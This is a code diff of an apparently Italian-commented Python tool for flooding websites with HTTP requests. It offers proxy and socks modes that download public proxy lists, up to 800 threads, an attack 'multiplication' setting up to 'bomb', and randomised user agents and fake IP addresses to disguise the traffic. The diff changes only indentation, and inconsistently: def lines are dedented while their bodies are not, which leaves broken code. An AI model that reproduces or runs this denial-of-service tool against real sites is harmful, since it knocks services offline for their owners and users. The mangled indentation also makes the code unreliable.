@@ -473,7 +473,7 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 					]
 
 
-		def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
+        def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
 			global url
 			global url2
 			global urlport
@@ -519,7 +519,7 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			proxymode()
 
 
-		def proxymode():
+	def proxymode():
 			global choice2
 			choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
 			if choice2 == "y":
@@ -527,7 +527,7 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			else:
 				numthreads()
 
-		def choiceproxysocks():
+	def choiceproxysocks():
 			global choice3
 			choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
 			if choice3 == "0":
@@ -538,7 +538,7 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 				print ("You mistyped, try again.")
 				choiceproxysocks()
 
-		def choicedownproxy():
+	def choicedownproxy():
 			choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
 			if choice4 == "y":
 				urlproxy = "http://free-proxy-list.net/"
@@ -546,7 +546,7 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			else:
 				proxylist()
 
-		def choicedownsocks():
+	def choicedownsocks():
 			choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
 			if choice4 == "y":
 				urlproxy = "https://www.socks-proxy.net/"
@@ -554,7 +554,7 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			else:
 				proxylist()
 
-		def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
+	def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
 			try:
 				req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
 				req.add_header("User-Agent", random.choice(useragents)) # siccome il format del sito e' identico sia
@@ -579,7 +579,7 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 				print ("\nERROR!\n")
 			proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()
 
-		def proxylist():
+	def proxylist():
 			global proxies
 			out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
 			if out_file == "":
@@ -587,7 +587,7 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			proxies = open(out_file).readlines()
 			numthreads()
 
-		def numthreads():
+	def numthreads():
 			global threads
 			try:
 				threads = int(input("Insert number of threads (800): "))
@@ -596,7 +596,7 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 				print ("800 threads selected.\n")
 			multiplication()
 
-		def multiplication():
+	def multiplication():
 			global multiple
 			try:
 				multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
@@ -605,7 +605,7 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 				multiplication()
 			begin()
 
-		def begin():
+	def begin():
 			choice6 = input("Press 'Enter' to start attack: ")
 			if choice6 == "":
 				loop()
@@ -616,7 +616,7 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			else:
 				exit(0)
 
-		def loop():
+	def loop():
 			global threads
 			global acceptall
 			global connection
@@ -661,13 +661,13 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 				go.set() # questo fa avviare i threads appena sono tutti pronti
 
 
-		class RequestProxyHTTP(threading.Thread): # la classe del multithreading
+	class RequestProxyHTTP(threading.Thread): # la classe del multithreading
 
-			def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+		def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
 				threading.Thread.__init__(self)
 				self.counter = counter
 
-			def run(self): # la funzione che da' le istruzioni ai vari threads
+		def run(self): # la funzione che da' le istruzioni ai vari threads
 				useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta useragent a caso
 				accept = random.choice(acceptall) # scelta header accept a caso
 				randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
@@ -698,13 +698,13 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 					except:
 						s.close() # se qualcosa va storto, chiude il socket e il ciclo ricomincia
 
-		class RequestSocksHTTP(threading.Thread): # la classe del multithreading
+	class RequestSocksHTTP(threading.Thread): # la classe del multithreading
 
-			def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+		def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
 				threading.Thread.__init__(self)
 				self.counter = counter
 
-			def run(self): # la funzione che da' le istruzioni ai vari threads
+		def run(self): # la funzione che da' le istruzioni ai vari threads
 				useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta proxy a caso
 				accept = random.choice(acceptall) # scelta accept a caso
 				if choice1 == "1":
@@ -748,13 +748,13 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 							print ("Sock down. Retrying request. @", self.counter)
 							s.close() # se nemmeno con quel try si e' riuscito a inviare niente, allora il sock e' down e chiude il socket.
 
-		class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
+	class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 
-			def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+		def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
 				threading.Thread.__init__(self)
 				self.counter = counter
 
-			def run(self): # la funzione che da' le istruzioni ai vari threads
+		def run(self): # la funzione che da' le istruzioni ai vari threads
 				useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # useragent a caso
 				accept = random.choice(acceptall) # accept a caso
 				if choice1 == "1":
